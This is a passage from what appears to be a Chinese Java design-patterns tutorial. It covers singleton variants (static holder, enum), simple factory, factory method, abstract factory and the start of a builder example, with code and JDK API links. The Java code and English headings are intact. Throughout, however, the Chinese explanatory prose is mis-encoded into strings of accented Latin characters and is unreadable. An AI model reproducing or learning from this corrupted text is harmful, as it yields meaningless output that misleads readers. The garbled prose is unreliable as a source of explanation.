<p>ä½¿ç”¨ volatile å¯ä»¥ç¦æ­¢ JVM çš„æŒ‡ä»¤é‡æ’ï¼Œä¿è¯åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ä¹Ÿèƒ½æ­£å¸¸è¿è¡Œã€‚</p>
<h4 id="v-é™æ€å†…éƒ¨ç±»å®ç°" tabindex="-1"> â…¤ é™æ€å†…éƒ¨ç±»å®ç°</h4>
<p>å½“ Singleton ç±»è¢«åŠ è½½æ—¶ï¼Œé™æ€å†…éƒ¨ç±» SingletonHolder æ²¡æœ‰è¢«åŠ è½½è¿›å†…å­˜ã€‚åªæœ‰å½“è°ƒç”¨ <code>getUniqueInstance()</code> æ–¹æ³•ä»è€Œè§¦å‘ <code>SingletonHolder.INSTANCE</code> æ—¶ SingletonHolder æ‰ä¼šè¢«åŠ è½½ï¼Œæ­¤æ—¶åˆå§‹åŒ– INSTANCE å®ä¾‹ï¼Œå¹¶ä¸” JVM èƒ½ç¡®ä¿ INSTANCE åªè¢«å®ä¾‹åŒ–ä¸€æ¬¡ã€‚</p>
<p>è¿™ç§æ–¹å¼ä¸ä»…å…·æœ‰å»¶è¿Ÿåˆå§‹åŒ–çš„å¥½å¤„ï¼Œè€Œä¸”ç”± JVM æä¾›äº†å¯¹çº¿ç¨‹å®‰å…¨çš„æ”¯æŒã€‚</p>
<div><pre><code><span>public</span> <span>class</span> <span>Singleton</span> <span>{</span>

    <span>private</span> <span>Singleton</span><span>(</span><span>)</span> <span>{</span>
    <span>}</span>

    <span>private</span> <span>static</span> <span>class</span> <span>SingletonHolder</span> <span>{</span>
        <span>private</span> <span>static</span> <span>final</span> <span>Singleton</span> INSTANCE <span>=</span> <span>new</span> <span>Singleton</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>static</span> <span>Singleton</span> <span>getUniqueInstance</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>SingletonHolder</span><span>.</span>INSTANCE<span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><h4 id="vi-æšä¸¾å®ç°" tabindex="-1"> â…¥ æšä¸¾å®ç°</h4>
<div><pre><code><span>public</span> <span>enum</span> <span>Singleton</span> <span>{</span>

    INSTANCE<span>;</span>

    <span>private</span> <span>String</span> objName<span>;</span>


    <span>public</span> <span>String</span> <span>getObjName</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> objName<span>;</span>
    <span>}</span>


    <span>public</span> <span>void</span> <span>setObjName</span><span>(</span><span>String</span> objName<span>)</span> <span>{</span>
        <span>this</span><span>.</span>objName <span>=</span> objName<span>;</span>
    <span>}</span>


    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>

        <span>// å•ä¾‹æµ‹è¯•</span>
        <span>Singleton</span> firstSingleton <span>=</span> <span>Singleton</span><span>.</span>INSTANCE<span>;</span>
        firstSingleton<span>.</span><span>setObjName</span><span>(</span><span>"firstName"</span><span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>firstSingleton<span>.</span><span>getObjName</span><span>(</span><span>)</span><span>)</span><span>;</span>
        <span>Singleton</span> secondSingleton <span>=</span> <span>Singleton</span><span>.</span>INSTANCE<span>;</span>
        secondSingleton<span>.</span><span>setObjName</span><span>(</span><span>"secondName"</span><span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>firstSingleton<span>.</span><span>getObjName</span><span>(</span><span>)</span><span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>secondSingleton<span>.</span><span>getObjName</span><span>(</span><span>)</span><span>)</span><span>;</span>

        <span>// åå°„è·å–å®ä¾‹æµ‹è¯•</span>
        <span>try</span> <span>{</span>
            <span>Singleton</span><span>[</span><span>]</span> enumConstants <span>=</span> <span>Singleton</span><span>.</span><span>class</span><span>.</span><span>getEnumConstants</span><span>(</span><span>)</span><span>;</span>
            <span>for</span> <span>(</span><span>Singleton</span> enumConstant <span>:</span> enumConstants<span>)</span> <span>{</span>
                <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>enumConstant<span>.</span><span>getObjName</span><span>(</span><span>)</span><span>)</span><span>;</span>
            <span>}</span>
        <span>}</span> <span>catch</span> <span>(</span><span>Exception</span> e<span>)</span> <span>{</span>
            e<span>.</span><span>printStackTrace</span><span>(</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br></div></div><div><pre><code>firstName
secondName
secondName
secondName
</code></pre></div><p>è¯¥å®ç°å¯ä»¥é˜²æ­¢åå°„æ”»å‡»ã€‚åœ¨å…¶å®ƒå®ç°ä¸­ï¼Œé€šè¿‡ setAccessible() æ–¹æ³•å¯ä»¥å°†ç§æœ‰æ„é€ å‡½æ•°çš„è®¿é—®çº§åˆ«è®¾ç½®ä¸º publicï¼Œç„¶åè°ƒç”¨æ„é€ å‡½æ•°ä»è€Œå®ä¾‹åŒ–å¯¹è±¡ï¼Œå¦‚æœè¦é˜²æ­¢è¿™ç§æ”»å‡»ï¼Œéœ€è¦åœ¨æ„é€ å‡½æ•°ä¸­æ·»åŠ é˜²æ­¢å¤šæ¬¡å®ä¾‹åŒ–çš„ä»£ç ã€‚è¯¥å®ç°æ˜¯ç”± JVM ä¿è¯åªä¼šå®ä¾‹åŒ–ä¸€æ¬¡ï¼Œå› æ­¤ä¸ä¼šå‡ºç°ä¸Šè¿°çš„åå°„æ”»å‡»ã€‚</p>
<p>è¯¥å®ç°åœ¨å¤šæ¬¡åºåˆ—åŒ–å’Œåºåˆ—åŒ–ä¹‹åï¼Œä¸ä¼šå¾—åˆ°å¤šä¸ªå®ä¾‹ã€‚è€Œå…¶å®ƒå®ç°éœ€è¦ä½¿ç”¨ transient ä¿®é¥°æ‰€æœ‰å­—æ®µï¼Œå¹¶ä¸”å®ç°åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ–¹æ³•ã€‚</p>
<h3 id="examples" tabindex="-1"> Examples</h3>
<ul>
<li>Logger Classes</li>
<li>Configuration Classes</li>
<li>Accesing resources in shared mode</li>
<li>Factories implemented as Singletons</li>
</ul>
<h3 id="jdk" tabindex="-1"> JDK</h3>
<ul>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/lang/Runtime.html#getRuntime%28%29" target="_blank" rel="noopener noreferrer">java.lang.Runtime#getRuntime()</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/awt/Desktop.html#getDesktop--" target="_blank" rel="noopener noreferrer">java.awt.Desktop#getDesktop()</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/lang/System.html#getSecurityManager--" target="_blank" rel="noopener noreferrer">java.lang.System#getSecurityManager()</a></li>
</ul>
<h2 id="_2-ç®€å•å·¥å‚-simple-factory" tabindex="-1"> 2. ç®€å•å·¥å‚ï¼ˆSimple Factoryï¼‰</h2>
<h3 id="intent-1" tabindex="-1"> Intent</h3>
<p>åœ¨åˆ›å»ºä¸€ä¸ªå¯¹è±¡æ—¶ä¸å‘å®¢æˆ·æš´éœ²å†…éƒ¨ç»†èŠ‚ï¼Œå¹¶æä¾›ä¸€ä¸ªåˆ›å»ºå¯¹è±¡çš„é€šç”¨æ¥å£ã€‚</p>
<h3 id="class-diagram-1" tabindex="-1"> Class Diagram</h3>
<p>ç®€å•å·¥å‚æŠŠå®ä¾‹åŒ–çš„æ“ä½œå•ç‹¬æ”¾åˆ°ä¸€ä¸ªç±»ä¸­ï¼Œè¿™ä¸ªç±»å°±æˆä¸ºç®€å•å·¥å‚ç±»ï¼Œè®©ç®€å•å·¥å‚ç±»æ¥å†³å®šåº”è¯¥ç”¨å“ªä¸ªå…·ä½“å­ç±»æ¥å®ä¾‹åŒ–ã€‚</p>
<p>è¿™æ ·åšèƒ½æŠŠå®¢æˆ·ç±»å’Œå…·ä½“å­ç±»çš„å®ç°è§£è€¦ï¼Œå®¢æˆ·ç±»ä¸å†éœ€è¦çŸ¥é“æœ‰å“ªäº›å­ç±»ä»¥åŠåº”å½“å®ä¾‹åŒ–å“ªä¸ªå­ç±»ã€‚å®¢æˆ·ç±»å¾€å¾€æœ‰å¤šä¸ªï¼Œå¦‚æœä¸ä½¿ç”¨ç®€å•å·¥å‚ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„å®¢æˆ·ç±»éƒ½è¦çŸ¥é“æ‰€æœ‰å­ç±»çš„ç»†èŠ‚ã€‚è€Œä¸”ä¸€æ—¦å­ç±»å‘ç”Ÿæ”¹å˜ï¼Œä¾‹å¦‚å¢åŠ å­ç±»ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„å®¢æˆ·ç±»éƒ½è¦è¿›è¡Œä¿®æ”¹ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/40c0c17e-bba6-4493-9857-147c0044a018.png"/> </div><br>
<h3 id="implementation-1" tabindex="-1"> Implementation</h3>
<div><pre><code><span>public</span> <span>interface</span> <span>Product</span> <span>{</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteProduct</span> <span>implements</span> <span>Product</span> <span>{</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteProduct1</span> <span>implements</span> <span>Product</span> <span>{</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteProduct2</span> <span>implements</span> <span>Product</span> <span>{</span>
<span>}</span>
</code></pre></div><p>ä»¥ä¸‹çš„ Client ç±»åŒ…å«äº†å®ä¾‹åŒ–çš„ä»£ç ï¼Œè¿™æ˜¯ä¸€ç§é”™è¯¯çš„å®ç°ã€‚å¦‚æœåœ¨å®¢æˆ·ç±»ä¸­å­˜åœ¨è¿™ç§å®ä¾‹åŒ–ä»£ç ï¼Œå°±éœ€è¦è€ƒè™‘å°†ä»£ç æ”¾åˆ°ç®€å•å·¥å‚ä¸­ã€‚</p>
<div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>

    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>int</span> type <span>=</span> <span>1</span><span>;</span>
        <span>Product</span> product<span>;</span>
        <span>if</span> <span>(</span>type <span>==</span> <span>1</span><span>)</span> <span>{</span>
            product <span>=</span> <span>new</span> <span>ConcreteProduct1</span><span>(</span><span>)</span><span>;</span>
        <span>}</span> <span>else</span> <span>if</span> <span>(</span>type <span>==</span> <span>2</span><span>)</span> <span>{</span>
            product <span>=</span> <span>new</span> <span>ConcreteProduct2</span><span>(</span><span>)</span><span>;</span>
        <span>}</span> <span>else</span> <span>{</span>
            product <span>=</span> <span>new</span> <span>ConcreteProduct</span><span>(</span><span>)</span><span>;</span>
        <span>}</span>
        <span>// do something with the product</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div><p>ä»¥ä¸‹çš„ SimpleFactory æ˜¯ç®€å•å·¥å‚å®ç°ï¼Œå®ƒè¢«æ‰€æœ‰éœ€è¦è¿›è¡Œå®ä¾‹åŒ–çš„å®¢æˆ·ç±»è°ƒç”¨ã€‚</p>
<div><pre><code><span>public</span> <span>class</span> <span>SimpleFactory</span> <span>{</span>

    <span>public</span> <span>Product</span> <span>createProduct</span><span>(</span><span>int</span> type<span>)</span> <span>{</span>
        <span>if</span> <span>(</span>type <span>==</span> <span>1</span><span>)</span> <span>{</span>
            <span>return</span> <span>new</span> <span>ConcreteProduct1</span><span>(</span><span>)</span><span>;</span>
        <span>}</span> <span>else</span> <span>if</span> <span>(</span>type <span>==</span> <span>2</span><span>)</span> <span>{</span>
            <span>return</span> <span>new</span> <span>ConcreteProduct2</span><span>(</span><span>)</span><span>;</span>
        <span>}</span>
        <span>return</span> <span>new</span> <span>ConcreteProduct</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>

    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>SimpleFactory</span> simpleFactory <span>=</span> <span>new</span> <span>SimpleFactory</span><span>(</span><span>)</span><span>;</span>
        <span>Product</span> product <span>=</span> simpleFactory<span>.</span><span>createProduct</span><span>(</span><span>1</span><span>)</span><span>;</span>
        <span>// do something with the product</span>
    <span>}</span>
<span>}</span>
</code></pre></div><h2 id="_3-å·¥å‚æ–¹æ³•-factory-method" tabindex="-1"> 3. å·¥å‚æ–¹æ³•ï¼ˆFactory Methodï¼‰</h2>
<h3 id="intent-2" tabindex="-1"> Intent</h3>
<p>å®šä¹‰äº†ä¸€ä¸ªåˆ›å»ºå¯¹è±¡çš„æ¥å£ï¼Œä½†ç”±å­ç±»å†³å®šè¦å®ä¾‹åŒ–å“ªä¸ªç±»ã€‚å·¥å‚æ–¹æ³•æŠŠå®ä¾‹åŒ–æ“ä½œæ¨è¿Ÿåˆ°å­ç±»ã€‚</p>
<h3 id="class-diagram-2" tabindex="-1"> Class Diagram</h3>
<p>åœ¨ç®€å•å·¥å‚ä¸­ï¼Œåˆ›å»ºå¯¹è±¡çš„æ˜¯å¦ä¸€ä¸ªç±»ï¼Œè€Œåœ¨å·¥å‚æ–¹æ³•ä¸­ï¼Œæ˜¯ç”±å­ç±»æ¥åˆ›å»ºå¯¹è±¡ã€‚</p>
<p>ä¸‹å›¾ä¸­ï¼ŒFactory æœ‰ä¸€ä¸ª doSomething() æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•éœ€è¦ç”¨åˆ°ä¸€ä¸ªäº§å“å¯¹è±¡ï¼Œè¿™ä¸ªäº§å“å¯¹è±¡ç”± factoryMethod() æ–¹æ³•åˆ›å»ºã€‚è¯¥æ–¹æ³•æ˜¯æŠ½è±¡çš„ï¼Œéœ€è¦ç”±å­ç±»å»å®ç°ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f4d0afd0-8e78-4914-9e60-4366eaf065b5.png"/> </div><br>
<h3 id="implementation-2" tabindex="-1"> Implementation</h3>
<div><pre><code><span>public</span> <span>abstract</span> <span>class</span> <span>Factory</span> <span>{</span>
    <span>abstract</span> <span>public</span> <span>Product</span> <span>factoryMethod</span><span>(</span><span>)</span><span>;</span>
    <span>public</span> <span>void</span> <span>doSomething</span><span>(</span><span>)</span> <span>{</span>
        <span>Product</span> product <span>=</span> <span>factoryMethod</span><span>(</span><span>)</span><span>;</span>
        <span>// do something with the product</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteFactory</span> <span>extends</span> <span>Factory</span> <span>{</span>
    <span>public</span> <span>Product</span> <span>factoryMethod</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>new</span> <span>ConcreteProduct</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteFactory1</span> <span>extends</span> <span>Factory</span> <span>{</span>
    <span>public</span> <span>Product</span> <span>factoryMethod</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>new</span> <span>ConcreteProduct1</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteFactory2</span> <span>extends</span> <span>Factory</span> <span>{</span>
    <span>public</span> <span>Product</span> <span>factoryMethod</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>new</span> <span>ConcreteProduct2</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><h3 id="jdk-1" tabindex="-1"> JDK</h3>
<ul>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/Calendar.html#getInstance--" target="_blank" rel="noopener noreferrer">java.util.Calendar</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/ResourceBundle.html#getBundle-java.lang.String-" target="_blank" rel="noopener noreferrer">java.util.ResourceBundle</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/text/NumberFormat.html#getInstance--" target="_blank" rel="noopener noreferrer">java.text.NumberFormat</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/nio/charset/Charset.html#forName-java.lang.String-" target="_blank" rel="noopener noreferrer">java.nio.charset.Charset</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/net/URLStreamHandlerFactory.html#createURLStreamHandler-java.lang.String-" target="_blank" rel="noopener noreferrer">java.net.URLStreamHandlerFactory</a></li>
<li><a href="https://docs.oracle.com/javase/8/docs/api/java/util/EnumSet.html#of-E-" target="_blank" rel="noopener noreferrer">java.util.EnumSet</a></li>
<li><a href="https://docs.oracle.com/javase/8/docs/api/javax/xml/bind/JAXBContext.html#createMarshaller--" target="_blank" rel="noopener noreferrer">javax.xml.bind.JAXBContext</a></li>
</ul>
<h2 id="_4-æŠ½è±¡å·¥å‚-abstract-factory" tabindex="-1"> 4. æŠ½è±¡å·¥å‚ï¼ˆAbstract Factoryï¼‰</h2>
<h3 id="intent-3" tabindex="-1"> Intent</h3>
<p>æä¾›ä¸€ä¸ªæ¥å£ï¼Œç”¨äºåˆ›å»º   <strong>ç›¸å…³çš„å¯¹è±¡å®¶æ—</strong>  ã€‚</p>
<h3 id="class-diagram-3" tabindex="-1"> Class Diagram</h3>
<p>æŠ½è±¡å·¥å‚æ¨¡å¼åˆ›å»ºçš„æ˜¯å¯¹è±¡å®¶æ—ï¼Œä¹Ÿå°±æ˜¯å¾ˆå¤šå¯¹è±¡è€Œä¸æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ä¸”è¿™äº›å¯¹è±¡æ˜¯ç›¸å…³çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¿…é¡»ä¸€èµ·åˆ›å»ºå‡ºæ¥ã€‚è€Œå·¥å‚æ–¹æ³•æ¨¡å¼åªæ˜¯ç”¨äºåˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œè¿™å’ŒæŠ½è±¡å·¥å‚æ¨¡å¼æœ‰å¾ˆå¤§ä¸åŒã€‚</p>
<p>æŠ½è±¡å·¥å‚æ¨¡å¼ç”¨åˆ°äº†å·¥å‚æ–¹æ³•æ¨¡å¼æ¥åˆ›å»ºå•ä¸€å¯¹è±¡ï¼ŒAbstractFactory ä¸­çš„ createProductA() å’Œ createProductB() æ–¹æ³•éƒ½æ˜¯è®©å­ç±»æ¥å®ç°ï¼Œè¿™ä¸¤ä¸ªæ–¹æ³•å•ç‹¬æ¥çœ‹å°±æ˜¯åœ¨åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ç¬¦åˆå·¥å‚æ–¹æ³•æ¨¡å¼çš„å®šä¹‰ã€‚</p>
<p>è‡³äºåˆ›å»ºå¯¹è±¡çš„å®¶æ—è¿™ä¸€æ¦‚å¿µæ˜¯åœ¨ Client ä½“ç°ï¼ŒClient è¦é€šè¿‡ AbstractFactory åŒæ—¶è°ƒç”¨ä¸¤ä¸ªæ–¹æ³•æ¥åˆ›å»ºå‡ºä¸¤ä¸ªå¯¹è±¡ï¼Œåœ¨è¿™é‡Œè¿™ä¸¤ä¸ªå¯¹è±¡å°±æœ‰å¾ˆå¤§çš„ç›¸å…³æ€§ï¼ŒClient éœ€è¦åŒæ—¶åˆ›å»ºå‡ºè¿™ä¸¤ä¸ªå¯¹è±¡ã€‚</p>
<p>ä»é«˜å±‚æ¬¡æ¥çœ‹ï¼ŒæŠ½è±¡å·¥å‚ä½¿ç”¨äº†ç»„åˆï¼Œå³ Cilent ç»„åˆäº† AbstractFactoryï¼Œè€Œå·¥å‚æ–¹æ³•æ¨¡å¼ä½¿ç”¨äº†ç»§æ‰¿ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e2190c36-8b27-4690-bde5-9911020a1294.png"/> </div><br>
<h3 id="implementation-3" tabindex="-1"> Implementation</h3>
<div><pre><code><span>public</span> <span>class</span> <span>AbstractProductA</span> <span>{</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>AbstractProductB</span> <span>{</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ProductA1</span> <span>extends</span> <span>AbstractProductA</span> <span>{</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ProductA2</span> <span>extends</span> <span>AbstractProductA</span> <span>{</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ProductB1</span> <span>extends</span> <span>AbstractProductB</span> <span>{</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ProductB2</span> <span>extends</span> <span>AbstractProductB</span> <span>{</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>abstract</span> <span>class</span> <span>AbstractFactory</span> <span>{</span>
    <span>abstract</span> <span>AbstractProductA</span> <span>createProductA</span><span>(</span><span>)</span><span>;</span>
    <span>abstract</span> <span>AbstractProductB</span> <span>createProductB</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteFactory1</span> <span>extends</span> <span>AbstractFactory</span> <span>{</span>
    <span>AbstractProductA</span> <span>createProductA</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>new</span> <span>ProductA1</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>AbstractProductB</span> <span>createProductB</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>new</span> <span>ProductB1</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteFactory2</span> <span>extends</span> <span>AbstractFactory</span> <span>{</span>
    <span>AbstractProductA</span> <span>createProductA</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>new</span> <span>ProductA2</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>AbstractProductB</span> <span>createProductB</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>new</span> <span>ProductB2</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>AbstractFactory</span> abstractFactory <span>=</span> <span>new</span> <span>ConcreteFactory1</span><span>(</span><span>)</span><span>;</span>
        <span>AbstractProductA</span> productA <span>=</span> abstractFactory<span>.</span><span>createProductA</span><span>(</span><span>)</span><span>;</span>
        <span>AbstractProductB</span> productB <span>=</span> abstractFactory<span>.</span><span>createProductB</span><span>(</span><span>)</span><span>;</span>
        <span>// do something with productA and productB</span>
    <span>}</span>
<span>}</span>
</code></pre></div><h3 id="jdk-2" tabindex="-1"> JDK</h3>
<ul>
<li><a href="http://docs.oracle.com/javase/8/docs/api/javax/xml/parsers/DocumentBuilderFactory.html" target="_blank" rel="noopener noreferrer">javax.xml.parsers.DocumentBuilderFactory</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/javax/xml/transform/TransformerFactory.html#newInstance--" target="_blank" rel="noopener noreferrer">javax.xml.transform.TransformerFactory</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/javax/xml/xpath/XPathFactory.html#newInstance--" target="_blank" rel="noopener noreferrer">javax.xml.xpath.XPathFactory</a></li>
</ul>
<h2 id="_5-ç”Ÿæˆå™¨-builder" tabindex="-1"> 5. ç”Ÿæˆå™¨ï¼ˆBuilderï¼‰</h2>
<h3 id="intent-4" tabindex="-1"> Intent</h3>
<p>å°è£…ä¸€ä¸ªå¯¹è±¡çš„æ„é€ è¿‡ç¨‹ï¼Œå¹¶å…è®¸æŒ‰æ­¥éª¤æ„é€ ã€‚</p>
<h3 id="class-diagram-4" tabindex="-1"> Class Diagram</h3>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/db5e376d-0b3e-490e-a43a-3231914b6668.png"/> </div><br>
<h3 id="implementation-4" tabindex="-1"> Implementation</h3>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€æ˜“çš„ StringBuilder å®ç°ï¼Œå‚è€ƒäº† JDK 1.8 æºç ã€‚</p>
<div><pre><code><span>public</span> <span>class</span> <span>AbstractStringBuilder</span> <span>{</span>
    <span>protected</span> <span>char</span><span>[</span><span>]</span> value<span>;</span>

    <span>protected</span> <span>int</span> count<span>;</span>

    <span>public</span> <span>AbstractStringBuilder</span><span>(</span><span>int</span> capacity<span>)</span> <span>{</span>
        count <span>=</span> <span>0</span><span>;</span>
        value <span>=</span> <span>new</span> <span>char</span><span>[</span>capacity<span>]</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>AbstractStringBuilder</span> <span>append</span><span>(</span><span>char</span> c<span>)</span> <span>{</span>
        <span>ensureCapacityInternal</span><span>(</span>count <span>+</span> <span>1</span><span>)</span><span>;</span>
        value<span>[</span>count<span>++</span><span>]</span> <span>=</span> c<span>;</span>
        <span>return</span> <span>this</span><span>;</span>
    <span>}</span>

    <span>private</span> <span>void</span> <span>ensureCapacityInternal</span><span>(</span><span>int</span> minimumCapacity<span>)</span> <span>{</span>
        <span>// overflow-conscious code</span>
        <span>if</span> <span>(</span>minimumCapacity <span>-</span> value<span>.</span>length <span>></span> <span>0</span><span>)</span>
            <span>expandCapacity</span><span>(</span>minimumCapacity<span>)</span><span>;</span>
    <span>}</span>

    <span>void</span> <span>expandCapacity</span><span>(</span><span>int</span> minimumCapacity<span>)</span> <span>{</span>
        <span>int</span> newCapacity <span>=</span> value<span>.</span>length <span>*</span> <span>2</span> <span>+</span> <span>2</span><span>;</span>
        <span>if</span> <span>(</span>newCapacity <span>-</span> minimumCapacity <span>&lt;</span> <span>0</span><span>)</span>
            newCapacity <span>=</span> minimumCapacity<span>;</span>
        <span>if</span> <span>(</span>newCapacity <span>&lt;</span> <span>0</span><span>)</span> <span>{</span>
            <span>if</span> <span>(</span>minimumCapacity <span>&lt;</span> <span>0</span><span>)</span> <span>// overflow</span>
                <span>throw</span> <span>new</span> <span>OutOfMemoryError</span><span>(</span><span>)</span><span>;</span>
            newCapacity <span>=</span> <span>Integer</span><span>.</span>MAX_VALUE<span>;</span>
        <span>}</span>
        value <span>=</span> <span>Arrays</span><span>.</span><span>copyOf</span><span>(</span>value<span>,</span> newCapacity<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>StringBuilder</span> <span>extends</span> <span>AbstractStringBuilder</span> <span>{</span>
    <span>public</span> <span>StringBuilder</span><span>(</span><span>)</span> <span>{</span>
        <span>super</span><span>(</span><span>16</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>String</span> <span>toString</span><span>(</span><span>)</span> <span>{</span>
        <span>// Create a copy, don't share the array</span>
        <span>return</span> <span>new</span> <span>String</span><span>(</span>value<span>,</span> <span>0</span><span>,</span> count<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
